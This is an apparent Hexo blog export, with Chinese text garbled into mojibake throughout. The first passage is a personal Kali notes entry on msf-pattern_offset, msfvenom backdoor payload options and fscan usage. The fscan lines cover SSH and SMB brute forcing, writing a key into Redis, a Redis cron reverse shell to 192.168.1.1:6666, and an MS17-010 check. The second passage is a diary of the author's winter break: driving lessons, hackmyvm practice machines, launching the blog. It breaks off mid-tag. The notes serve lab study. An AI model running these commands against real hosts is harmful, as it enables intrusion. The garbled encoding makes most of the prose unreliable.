<h2 id="msf-pattern-offset"><a href="#msf-pattern-offset" class="headerlink" title="msf-pattern_offset"></a>msf-pattern_offset</h2><p><code>msf-pattern_offset</code> æ˜¯ Metasploit Framework ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œé€šå¸¸ç”¨äºç¼“å†²åŒºæº¢å‡ºæ¼æ´æµ‹è¯•ä¸­ï¼Œå¸®åŠ©è°ƒè¯•äººå‘˜ç¡®å®šè¾“å…¥æ¨¡å¼çš„åç§»é‡ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒç”¨äºåˆ†æç¨‹åºå´©æºƒæ—¶çš„æ ˆï¼Œå¸®åŠ©ä½ æ‰¾å‡ºæº¢å‡ºæ•°æ®åˆ°è¾¾è¿”å›åœ°å€æˆ–å…¶ä»–å…³é”®å†…å­˜ä½ç½®çš„ç²¾ç¡®åç§»ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SH"><figure class="iseeu highlight /sh"><table><tr><td class="code"><pre><span class="line">msf-pattern_offset -q 0x6161616b</span><br></pre></td></tr></table></figure></div>
<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>msfvenom æ˜¯ msfpayloadï¼ˆæ”»å‡»è½½è·ï¼‰å’Œ msfencodeï¼ˆç¼–ç åŠ å¯†ï¼‰çš„ç»„åˆã€‚å°†è¿™ä¸¤ä¸ªå·¥å…·é›†æˆåœ¨ä¸€ä¸ªæ¡†å®ä¾‹ä¸­ã€‚</p>
<p>è¿›ä¸€æ­¥è§£é‡Šï¼Œmsfvenom æ˜¯ç”¨æ¥ç”Ÿæˆåé—¨çš„è½¯ä»¶ï¼Œåœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œåé—¨ï¼Œåœ¨æœ¬åœ°ç›‘å¬ä¸Šçº¿ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªè¿œæ§æœ¨é©¬ã€‚</p>
<p>msfvenom åŸºæœ¬å‚æ•°<br>-p:â€“payloadï¼ŒæŒ‡å®šç‰¹å®šçš„ Payloadï¼Œå¦‚æœè¢«è®¾ç½®ä¸ºï¼Œé‚£ä¹ˆä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å–ã€‚å‡ ä¹æ”¯æŒå…¨å¹³å°<br>-l:â€“listï¼Œåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„é¡¹ç›®ï¼Œå…¶ä¸­å€¼å¯ä»¥è¢«è®¾ç½®ä¸º payloads,encoders,nops,all<br>-n:â€“nopsledï¼ŒæŒ‡å®š nop åœ¨ payload ä¸­çš„æ•°é‡<br>-f:â€“formatï¼ŒæŒ‡å®š Payload çš„è¾“å‡ºæ ¼å¼ (â€“list formats: åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„è¾“å‡ºæ ¼å¼)<br>-e: â€“encoderï¼ŒæŒ‡å®šä½¿ç”¨çš„ encoder<br>-a:â€“archï¼ŒæŒ‡å®šç›®æ ‡ç³»ç»Ÿæ¶æ„<br>â€“platform: æŒ‡å®šç›®æ ‡ç³»ç»Ÿå¹³å°<br>-s:â€“spaceï¼Œè®¾ç½®æœªç»ç¼–ç çš„ Payload çš„æœ€å¤§é•¿åº¦ (â€“encoder-space: ç¼–ç åçš„ Payload çš„æœ€å¤§é•¿åº¦)<br>-b:â€“bad-charsï¼Œè®¾ç½®éœ€è¦åœ¨ Payload ä¸­é¿å…å‡ºç°çš„å­—ç¬¦ï¼Œä¾‹å¦‚: 0fâ€™lx00â€™ç­‰<br>-i:â€“iterationsï¼Œè®¾ç½® Payload çš„ç¼–ç æ¬¡æ•°<br>â€“smallest: å°½å¯èƒ½ç”Ÿæˆæœ€çŸ­çš„ Payload<br>-o:â€“outï¼Œä¿å­˜ Pavload åˆ°æ–‡ä»¶<br>-c â€“add-codeï¼ŒæŒ‡å®šä¸€ä¸ªé™„åŠ çš„ win32 shellcode æ–‡ä»¶<br>-x â€“templateï¼ŒæŒ‡å®šä¸€ä¸ªç‰¹å®šçš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿<br>-k â€“keepï¼Œä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠŸèƒ½ï¼Œæ³¨å…¥çš„ pavload ä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</p>
<p>æœ€å¸¸ç”¨çš„å‚æ•°å°±æ˜¯ -p ï¼Œ-f ï¼Œ-x å’Œ -e</p>
<p>-f rawç”ŸæˆåŸå§‹çš„shellcode</p>
<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>fscanÂ æ˜¯ä¸€ä¸ªå†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½<a href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F&spm=1001.2101.3001.7020">æ¼æ´æ‰«æ</a>ã€‚</p>
<p>å®ƒæ”¯æŒä¸»æœºå­˜æ´»æ¢æµ‹ã€<a href="https://so.csdn.net/so/search?q=%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&spm=1001.2101.3001.7020">ç«¯å£æ‰«æ</a>ã€å¸¸è§æœåŠ¡çš„çˆ†ç ´ã€ms17010ã€redisæ‰¹é‡å†™å…¬é’¥ã€è®¡åˆ’ä»»åŠ¡åå¼¹shellã€è¯»å–winç½‘å¡ä¿¡æ¯ã€webæŒ‡çº¹è¯†åˆ«ã€webæ¼æ´æ‰«æã€netbiosæ¢æµ‹ã€åŸŸæ§è¯†åˆ«ç­‰åŠŸèƒ½ã€‚<br>ç®€å•ç”¨æ³•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span>  (é»˜è®¤ä½¿ç”¨å…¨éƒ¨æ¨¡å—)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">16</span>  (Bæ®µæ‰«æ)</span><br></pre></td></tr></table></figure></div>
<p>å…¶ä»–ç”¨æ³•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -np -no -nopoc(è·³è¿‡å­˜æ´»æ£€æµ‹ ã€ä¸ä¿å­˜æ–‡ä»¶ã€è·³è¿‡web pocæ‰«æ)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -rf id_rsa.pub (redis å†™å…¬é’¥)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -rs <span class="number">192.168.1.1:6666</span> (redis è®¡åˆ’ä»»åŠ¡åå¼¹shell)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -c whoami (ssh çˆ†ç ´æˆåŠŸåï¼Œå‘½ä»¤æ‰§è¡Œ)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -m ssh -p <span class="number">2222</span> (æŒ‡å®šæ¨¡å—sshå’Œç«¯å£)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -pwdf pwd.txt -userf users.txt (åŠ è½½æŒ‡å®šæ–‡ä»¶çš„ç”¨æˆ·åã€å¯†ç æ¥è¿›è¡Œçˆ†ç ´)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -o /tmp/<span class="number">1</span>.txt (æŒ‡å®šæ‰«æç»“æœä¿å­˜è·¯å¾„,é»˜è®¤ä¿å­˜åœ¨å½“å‰è·¯å¾„) </span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">8</span>  (Aæ®µçš„<span class="number">192</span>.x.x.<span class="number">1</span>å’Œ<span class="number">192</span>.x.x.<span class="number">254</span>,æ–¹ä¾¿å¿«é€ŸæŸ¥çœ‹ç½‘æ®µä¿¡æ¯ )</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -m smb -pwd password (smbå¯†ç ç¢°æ’)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -m ms17010 (æŒ‡å®šæ¨¡å—)</span><br><span class="line"><span class="attribute">fscan</span>.exe -hf ip.txt  (ä»¥æ–‡ä»¶å¯¼å…¥)</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>linux</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
        <tag>linux</tag>
        <tag>æ“ä½œç³»ç»Ÿ</tag>
        <tag>kali</tag>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>å¯’å‡æ€»ç»“</title>
    <url>/posts/62818.html</url>
    <content><![CDATA[<p>2025å¯’å‡æ€»ç»“</p>
<span id="more"></span>
<p>2æœˆ15å·åˆ°å­¦æ ¡äº†ï¼Œæˆ‘çŸ­çŸ­çš„å¯’å‡åˆç»“æŸäº†ã€‚è¿™ä¸ªå¯’å‡æ„Ÿè§‰è¿˜æ˜¯æŒºå……å®çš„ï¼Œè‡³å°‘ä¸åƒå‰å‡ ä¸ªå‡æœŸä¸€æ ·æµ‘æµ‘å™©å™©</p>
<h1 id="é©¾ç…§åˆ°æ‰‹"><a href="#é©¾ç…§åˆ°æ‰‹" class="headerlink" title="é©¾ç…§åˆ°æ‰‹"></a>é©¾ç…§åˆ°æ‰‹</h1><p>ä¸€å›å®¶å°±å¼€å§‹ç»ƒç§‘äºŒäº†ï¼Œä¸€ç§‘ä¸€ç§‘æ²¡æƒ³åˆ°ä¹Ÿèµ¶åœ¨å¯’å‡ç»“æŸä¹‹å‰æ‹¿åˆ°é©¾ç…§äº†<br><img src="https://pic1.imgdb.cn/item/67b0b0d7d0e0a243d4ffb260.jpg"><br><img src="https://pic1.imgdb.cn/item/67b0b0e6d0e0a243d4ffb261.jpg"><br><img src="https://pic1.imgdb.cn/item/67b0b0f8d0e0a243d4ffb264.jpg"><br><img src="https://pic1.imgdb.cn/item/67b0b104d0e0a243d4ffb265.jpg"><br>åœ¨è€ƒç§‘äºŒçš„å‰ä¸€å¤©è¿˜å¾—äº†ç”²æµå‘çƒ§ï¼Œè¿˜å¥½æœ€åè¿˜æ˜¯æœ‰æƒŠæ— é™©çš„é€šè¿‡äº†ã€‚é©¾ç…§è¿™åº§å¤§å±±ä¹Ÿæ˜¯ç¿»è¿‡äº†å“ˆå“ˆå“ˆå“ˆ</p>
<h1 id="æ¥è§¦é¶æœºå’Œhackmyvmå¹³å°"><a href="#æ¥è§¦é¶æœºå’Œhackmyvmå¹³å°" class="headerlink" title="æ¥è§¦é¶æœºå’Œhackmyvmå¹³å°"></a>æ¥è§¦é¶æœºå’Œhackmyvmå¹³å°</h1><p>å› ä¸ºæˆ‘æœ¬èº«æ˜¯ç½‘å®‰ä¸“ä¸šçš„ï¼Œåœ¨æ”¾å‡ä¹‹å‰ä¹Ÿç¨å¾®æŠŠæ¼æ´çš„ç±»å‹çœ‹äº†ä¸€éï¼Œåœ¨æ”¾å‡å­¦è½¦çš„æ—¶å€™åˆ·åˆ°äº†ç¾¤ä¸»çš„è§†é¢‘<br><img src="https://pic1.imgdb.cn/item/67b0b18dd0e0a243d4ffb272.png"><br>æˆ‘é ï¼Œå¤§æ•°æ®è¿˜çœŸæ˜¯ç¥å¥‡ï¼Œæˆ‘çœ‹å®Œä¸€ä¸ªè§†é¢‘ä¹‹åè§‰å¾—è€æœ‰æ„æ€äº†ï¼Œè€Œä¸”è¿™ä¸ªå’Œæˆ‘ä¸“ä¸šè¦å­¦çš„å†…å®¹ä¸€æ ·ã€‚<br>å‰é¢å­¦è½¦åœ¨ç­‰çš„æ—¶é—´æˆ‘å°±çœ‹ç¾¤ä¸»æœ€æ—©çš„å‡ ä¸ªè§†é¢‘ï¼Œå°±æ˜¯vulnhubçš„DCç³»åˆ—é¶æœºï¼Œç„¶åè‡ªå·±å›å»ä¹‹åè·Ÿç€è§†é¢‘å¤ç°ï¼Œåšäº›ç¬”è®°ã€‚<br>æˆ‘è‡ªå·±ä»¥å‰æ˜¯æœ‰å­¦è¿‡ä¸€ç‚¹linuxçš„ï¼Œä¸è¿‡éƒ½æ˜¯Linuxçš„å…¥é—¨çš„æŒ‡ä»¤æ¯”å¦‚ls cat è¿™äº›æœ€åŸºæœ¬çš„ï¼Œè¿˜æ˜¯æœ‰å¥½å¤šçŸ¥è¯†éƒ½ä¸çŸ¥é“ï¼Œç„¶åå­¦è¿‡vimç¼–è¾‘å™¨çš„ä½¿ç”¨ã€‚<br>åœ¨çœ‹å®Œè§†é¢‘ä¹‹åï¼Œè‡ªå·±è£…äº†kaliï¼Œç„¶åè¾¹å­¦è¾¹è®°ç”¨åˆ°çš„linuxï¼Œå°±æœ‰äº†æˆ‘ç°åœ¨linuxæŒ‡ä»¤ç¬”è®°å’Œkaliå·¥å…·ç¬”è®°ï¼Œè¿™äº›éƒ½æ˜¯æˆ‘åœ¨åšé¶æœºçš„æ—¶å€™ä¸€ä¸ªä¸ªé‡åˆ°çš„æœçš„ï¼Œæ²¡æƒ³åˆ°ç°åœ¨å·²ç»ä¹Ÿå­¦äº†è¿™ä¹ˆå¤šäº†å“ˆå“ˆå“ˆã€‚<br>æ‰€ä»¥åœ¨çœ‹è¿‡DCç³»åˆ—9ä¸ªé¶æœºä¹‹åï¼Œæˆ‘å·²ç»å¯¹linuxå¸¸ç”¨çš„å‘½ä»¤æœ‰äº†ä¸€ä¸ªå¤§è‡´çš„ç†è§£ï¼Œä¹Ÿç®—æ˜¯å…¥äº†é—¨å§ã€‚<br>æ¥ä¸‹æ¥å°±æ˜¯æ¥è§¦åˆ°hmvè¿™ä¸ªå¹³å°äº†ï¼Œè¿™ä¸ªå¹³å°çœŸæ˜¯ä¸ªå¥½å¹³å°å•Šï¼Œä¹Ÿæ˜¯çœ‹ç¾¤ä¸»çš„ç½®é¡¶è§†é¢‘é‡Œé¢æˆ‘æ‰çŸ¥é“çš„<br><img src="https://pic1.imgdb.cn/item/67b0b301d0e0a243d4ffb298.png"><br>è¿™ä¸ªå¹³å°å’Œvulnhubå·®ä¸å¤šï¼Œå°±æ˜¯ä¸€ä¸ªæä¾›é¶æœºçš„å¹³å°ï¼Œä½†æ˜¯å®ƒä¸€ç›´åœ¨æ›´æ–°ï¼Œè€Œä¸”æœ‰å¾ˆå¼ºçš„åé¦ˆæ•ˆæœã€‚åœ¨è¿™é‡Œå®Œæˆé¶æœºéƒ½æœ‰ç›¸åº”çš„åˆ†æ•°ï¼Œç„¶åæœ‰æ’åï¼Œå’Œæ‰“æ¸¸æˆä¸€æ ·ï¼Œè¿˜æœ‰æ®µä½ï¼Œç‰¹åˆ«æœ‰æ„æ€ã€‚<br><img src="https://pic1.imgdb.cn/item/67b0b352d0e0a243d4ffb29f.png"><br><img src="https://pic1.imgdb.cn/item/67b0b379d0e0a243d4ffb2a3.png"><br>ä»easyåšèµ·ï¼Œä¸ä¼šçš„å°±çœ‹è§†é¢‘ï¼Œç„¶åè®°èµ·æ¥ï¼Œæ­£åé¦ˆå¾ˆå¼ºhhh<br>ç„¶åè¿˜å¼€æ‡¦å¤«æ¨¡å¼åšäº†venusçš„labï¼ŒåŠ å¼ºäº†linuxçš„ä½¿ç”¨æŠ€å·§ï¼Œå¾ˆå¥½ç©ï¼Œä¸€å…³å…³çš„ï¼Œéå¸¸é€‚åˆæƒ³å­¦linuxçš„äºº<br><img src="https://pic1.imgdb.cn/item/67b0b4c7d0e0a243d4ffb2c1.png"><br>åé¢æœ‰äº†åšå®¢ä¹‹åï¼Œå°±æ˜¯è¾¹åšè¾¹å†™wpï¼Œè¿˜èƒ½æœ‰ç§¯åˆ†å“ˆå“ˆå“ˆï¼Œæœ€åä¹Ÿæ˜¯æ··åˆ°äº†æ’åï¼ˆè™½ç„¶è¿™ä¸ªæ’åä»£è¡¨ä¸äº†ä»€ä¹ˆï¼Œä¸€äº›å¤§ä½¬é¶æœºåšå®Œäº†ä»Šå¹´å°±æ²¡ä»€ä¹ˆç§¯åˆ†ï¼‰<br>ä½†æ˜¯è¿˜æ˜¯ç»™æˆ‘ä¸€äº›å°å°çš„æˆå°±æ„Ÿ<br><img src="https://pic1.imgdb.cn/item/67b0b518d0e0a243d4ffb2cb.png"></p>
<h1 id="åŠ å…¥ç¾¤èŠ"><a href="#åŠ å…¥ç¾¤èŠ" class="headerlink" title="åŠ å…¥ç¾¤èŠ"></a>åŠ å…¥ç¾¤èŠ</h1><p>ä¸Šé¢æˆ‘è¯´çš„ç¾¤ä¸»å°±æ˜¯è¿™ä¸ªhmvçš„ç¾¤çš„ç¾¤ä¸»å•¦<br>è¿™ä¸ªç¾¤ä¸»è¦å°±æ˜¯æ‰“hmvçš„ç¾¤ï¼Œå¦‚æœä½ ä¹Ÿæœ‰æ‰“hmvæˆ–è€…è§‰å¾—è‡ªå·±æŠ€æœ¯è¿˜å¯ä»¥æ¬¢è¿åŠ å…¥ï¼Œç¾¤å·660930334<br>ä½†æ˜¯ä¸æ¨èæ–°æ‰‹å…¥ç¾¤ï¼Œå› ä¸ºæ–°æ‰‹å¦‚æœä¸èƒ½åšé¢˜æ‹¿åˆ°ç§°å·ä¼šè¢«è¸¢<br>ç„¶åç¾¤é‡Œæœ‰æ—¶å€™ä¼šå‡ºé¢˜ç›®ï¼Œå¤§å®¶è§£å†³ä¹‹åä¸€èµ·åˆ†äº«åšæ³•ï¼Œä¹Ÿå¾ˆæœ‰æ„æ€<br><img src="https://pic1.imgdb.cn/item/67b0b6f2d0e0a243d4ffb31c.png"><br>ç„¶åç¾¤ä¸»ä¹Ÿæ•™ä¼šäº†å¾ˆå¤šï¼Œæœ‰ç‚¹è®©æˆ‘è±ç„¶å¼€æœ—çš„æ„Ÿè§‰å“ˆå“ˆå“ˆå“ˆ</p>
<h1 id="å¯’å‡å¯¹æˆ‘è€Œè¨€æœ€å¤§çš„äº‹"><a href="#å¯’å‡å¯¹æˆ‘è€Œè¨€æœ€å¤§çš„äº‹" class="headerlink" title="å¯’å‡å¯¹æˆ‘è€Œè¨€æœ€å¤§çš„äº‹"></a>å¯’å‡å¯¹æˆ‘è€Œè¨€æœ€å¤§çš„äº‹</h1><p>å°±æ˜¯æˆ‘çš„åšå®¢ä¸Šçº¿å•¦ï¼ï¼<br><img src="https://pic1.imgdb.cn/item/67b0b786d0e0a243d4ffb32b.png"><br>ç°åœ¨æˆ‘å·²ç»å¯¹è¿™ä¸ªç•Œé¢æŒºæ»¡æ„çš„äº†ï¼Œè¿˜æ˜¯åå‘ç®€çº¦é£<br>åœ¨ä¹‹å‰å°±æƒ³æ­å»ºä¸€ä¸ªåšå®¢è®°å½•è‡ªå·±çš„ç¬”è®°å’Œå­¦ä¹ å¿ƒå¾—äº†ï¼Œç»ˆäºåœ¨å¯’å‡çš„æ—¶å€™è®©æˆ‘æœ‰æ—¶é—´æ­å»ºå’Œéƒ¨ç½²äº†ã€‚<br>è¿™ä¸ªåšå®¢æ˜¯ç”¨hexoæ­å»ºçš„ï¼Œè·Ÿç€è§†é¢‘å’Œåˆ«äººçš„åšå®¢è¿˜æ˜¯å¾ˆå¥½æ­å»ºçš„ï¼Œæœ€éš¾çš„è¿˜æ˜¯é€‰å¥½ä¸»é¢˜ä¹‹åçš„é…ç½®äº†ã€‚<br>è¿™ä¸ªé…ç½®è®©æˆ‘åœ¨ç½‘ä¸Šåˆ°å¤„æ‰¾èµ„æ–™ç„¶åä¿®æ”¹ï¼Œæœ‰äº›ä¹Ÿä¸èƒ½ç›´æ¥ç”¨ï¼Œæœ€ç»ˆèŠ±äº†ä¸¤å¤©è¾¾åˆ°äº†ç°åœ¨çš„æ•ˆæœï¼Œè‡³å°‘ç»“æœæ˜¯å¥½çš„<br>ä¸è¿‡è¯´èµ·æ¥ï¼Œæœ€ç›´æ¥çš„åŸå› ä¹Ÿæ˜¯hmvè¿™ä¸ªå¹³å°ï¼Œå› ä¸ºåšå®Œä¸€ä¸ªé¶æœºä¹‹åå¯ä»¥ä¸Šä¼ è‡ªå·±çš„wp<br>åœ¨æ­å»ºå®Œåšå®¢ä¹‹åæˆ‘å°±æŠŠä¹‹å‰çš„é¶æœºçš„è®°å½•å…¨æ•´ç†ä¸Šä¼ äº†ï¼Œä¹Ÿæ˜¯æœ‰ç‚¹å°å°çš„æˆå°±æ„Ÿäº†ã€‚<br>æˆ‘è‡ªå·±åœ¨æ¥è§¦è¿™æ–¹é¢ä¸€å¼€å§‹çš„æ—¶å€™é‡åˆ°çš„é—®é¢˜å°±æ˜¯æˆ‘æ˜¯macçš„mèŠ¯ç‰‡ç”µè„‘ï¼Œé¶æœºä¸€èˆ¬éƒ½æ˜¯è¿è¡Œx86ç³»ç»Ÿçš„ï¼Œæ‰€ä»¥æˆ‘è¿˜æŠ˜è…¾äº†macæ€ä¹ˆå®‰è£…é¶æœºï¼Œæ‰€ä»¥åœ¨æˆ‘åšå®¢é‡Œé¢ä¹Ÿæœ‰ä¸“é—¨çš„ä¸€ä¸ªåˆ†ç±»è®°å½•æˆ‘çš„macé¶æœºæ­å»ºæ–¹æ¡ˆ<br>åšå®¢ä¸Šçº¿ä¹‹åï¼Œæˆ‘çš„å†…å®¹è¿˜æ˜¯æŒºå•è°ƒçš„ï¼ŒåŸºæœ¬éƒ½æ˜¯é¶æœºçš„å¤ç›˜wpï¼Œåé¢å°±æ…¢æ…¢åŠ äº†ctfï¼Œlinuxè¿™äº›ï¼Œä»¥ååº”è¯¥è¿˜ä¼šä¸Šä¼ ç¼–ç¨‹çš„å­¦ä¹ ç¬”è®°ã€‚æŒºå¥½<br><img src="https://pic1.imgdb.cn/item/67b0b8ead0e0a243d4ffb354.png"><br>åœ¨å¯’å‡æˆ‘è¿˜æ˜¯èƒ½ä¿æŒä¸€å¤©ä¸€ä¸¤æ›´ï¼Œå¼€å­¦äº†ä¼°è®¡å°±æ²¡å•¥è‡ªå·±çš„æ—¶é—´äº†ã€‚ã€‚ğŸ˜‘</p>
<h1 id="æ·˜åˆ°å¥½ç‰©"><a href="#æ·˜åˆ°å¥½ç‰©" class="headerlink" title="æ·˜åˆ°å¥½ç‰©"></a>æ·˜åˆ°å¥½ç‰©</h1><p><img src="https://pic1.imgdb.cn/item/67b0b948d0e0a243d4ffb35b.jpg"><br>è¿™æ¬¾é”®ç›˜å«åškeychron k3 maxï¼Œ æˆ‘ç»å¸¸åœ¨macçš„å¥½ç‰©åˆ†äº«ä¸Šçœ‹åˆ°å®ƒï¼Œè€Œä¸”å®ƒæ˜¯macå®˜æ–¹é…å›¾é‡Œé¢çš„é”®ç›˜<br>è€Œä¸”è¿™æ¬¾çš„é¢œå€¼ä¹Ÿéå¸¸æˆ³ä¸­æˆ‘ï¼Œæœ€æœ€é‡è¦çš„æ˜¯ï¼Œæˆ‘ä¹‹å‰çš„æœºæ¢°é”®ç›˜ç‰¹åˆ«é‡è€Œä¸”æ²¡æœ‰ä¸‰æ¨¡ï¼Œä¸€ç›´éƒ½æ˜¯æœ‰çº¿ä½¿ç”¨ï¼Œå¾ˆéº»çƒ¦<br>è¿™æ¬¾é”®ç›˜æ˜¯çŸ®çº¢è½´çš„ï¼Œå¾ˆè½»ï¼Œè€Œä¸”ä¸‰æ¨¡ï¼Œæ‰‹æ„Ÿä¹Ÿç‰¹åˆ«å¥½ï¼Œå£°éŸ³ä¹Ÿä¸å¤§ï¼Œæ‰“å­—ä¹…äº†ä¹Ÿä¸ç´¯</p>
<p><img src="https://pic1.imgdb.cn/item/67b0ba68d0e0a243d4ffb398.jpg"><br>æˆ‘ç”¨çš„å¾ˆçˆ½ğŸ˜Œ<br>ç„¶åå’Œmacçš„é”®ç›˜å¤§å°ä¹Ÿå·®ä¸å¤šï¼Œæˆ‘å°±å¯ä»¥ç›´æ¥å¤¹åœ¨åŸæ¥çš„é”®ç›˜ä¸Šé¢ä½¿ç”¨<br><img src="https://pic1.imgdb.cn/item/67b0ba99d0e0a243d4ffb3a9.jpg"><br>åœ¨å®¶é‡Œæˆ‘åŸºæœ¬éƒ½åœ¨åºŠä¸Šæ•²å­—ï¼Œæ‰€ä»¥å¯¹æˆ‘æ¥è¯´è¿˜æ˜¯å¾ˆé‡è¦çš„ã€‚<br>å¯¹äº†ï¼Œè¿˜æœ‰ä¸€ç‚¹ï¼Œè¿™ä¸ªé”®ç›˜å¯¹macçš„æ”¯æŒå¾ˆå¥½ï¼Œè‡ªå¸¦çš„é”®å¸½å°±æ˜¯macçš„é…ç½®ï¼Œæ™®é€šçš„é”®ç›˜ä¸€èˆ¬éƒ½æ˜¯windowsçš„ï¼Œæˆ‘æ¥åˆ°macä¹‹åè¿˜è¦æ”¹é”®ä½<br>è¿™ä¸ªé”®ç›˜ä¸Šé¢çš„åŠŸèƒ½é”®å°±æ˜¯macè‡ªå¸¦çš„åŠŸèƒ½é”®ä¸€æ ·ï¼Œéå¸¸å¥½ç”¨</p>
<h1 id="å›å®¶å°±æ˜¯å¥½"><a href="#å›å®¶å°±æ˜¯å¥½" class="headerlink" title="å›å®¶å°±æ˜¯å¥½"></a>å›å®¶å°±æ˜¯å¥½</h1><p><img src="https://pic1.imgdb.cn/item/67b0bb2cd0e0a243d4ffb3c3.jpg"><br>ä¸Šæ¥ä¸€å¹…å›¾ï¼Œå›å®¶å°±æ˜¯åƒåƒåƒï¼Œä¸€å¤©åƒä¸ªå››äº”é¡¿ğŸ˜‚ å¤œå®µä¹Ÿæ˜¯å˜å˜åƒ<br>ï¼ˆåœ¨å­¦æ ¡å°±æ²¡è¿™ç¦äº«äº†ï¼Œåªèƒ½ä¹–ä¹–åƒé¢„åˆ¶èœäº†ã€‚ã€‚<br>ç„¶åå°±æ˜¯æˆ‘ä»¬ç¦å»ºäººè¿™è¾¹è¿‡å¹´å°±æ˜¯æ‰“ç‰Œæ“éº»å°†äº†ï¼Œå’Œå®¶é‡Œäººç©ç‰¹åˆ«å¼€å¿ƒï¼<br><img src="https://pic1.imgdb.cn/item/67b0bb8fd0e0a243d4ffb3da.jpg"><br>è¦è¯´å›å­¦æ ¡å¥½çš„å°±æ˜¯å®¿èˆæœ‰æˆ‘çš„æ˜¾ç¤ºå™¨äº†ï¼Œåœ¨å®¶é‡Œå°å°çš„å±å¹•è¿˜æ˜¯æœ‰ç‚¹éš¾å—çš„<br><img src="https://pic1.imgdb.cn/item/67b0c076d0e0a243d4ffb455.jpg"><br>å¤§å±å°±æ˜¯çˆ½ï¼</p>
<h1 id="å¯’å‡å®è·µ"><a href="#å¯’å‡å®è·µ" class="headerlink" title="å¯’å‡å®è·µ"></a>å¯’å‡å®è·µ</h1><p>åœ¨ä¸Šä¸ªå¯’å‡æˆ‘æŠ¥åäº†è¿”æ ¡å®£è®²å’Œæ„Ÿè°¢å¸ˆæ©ï¼Œè¿™æ¬¡å¯’å‡æˆ‘å°±æŠ¥äº†æ„Ÿè°¢å¸ˆæ©ï¼Œè¿˜æ˜¯æŒºå¥½çš„ï¼Œä¹Ÿæ²¡å•¥å‹åŠ›ï¼Œå°±æ˜¯å’ŒåŒå­¦å›æ¯æ ¡çœ‹çœ‹è€å¸ˆï¼Œä¸å¾—ä¸è¯´ï¼Œå­¦æ ¡å°±æ˜¯ä¼šåœ¨æˆ‘ä»¬æ¯•ä¸šä¹‹åæœ‰å¥½å¤šæ–°ä¸œè¥¿ã€‚<br><img src="https://pic1.imgdb.cn/item/67b0bf71d0e0a243d4ffb43d.jpg"></p>
<h1 id="å¼€å­¦ç„¦è™‘"><a href="#å¼€å­¦ç„¦è™‘" class="headerlink" title="å¼€å­¦ç„¦è™‘"></a>å¼€å­¦ç„¦è™‘</h1><p>å¿«å¼€å­¦äº†ï¼Œå…ˆçœ‹çœ‹æˆ‘çš„è¯¾è¡¨å§<br><img 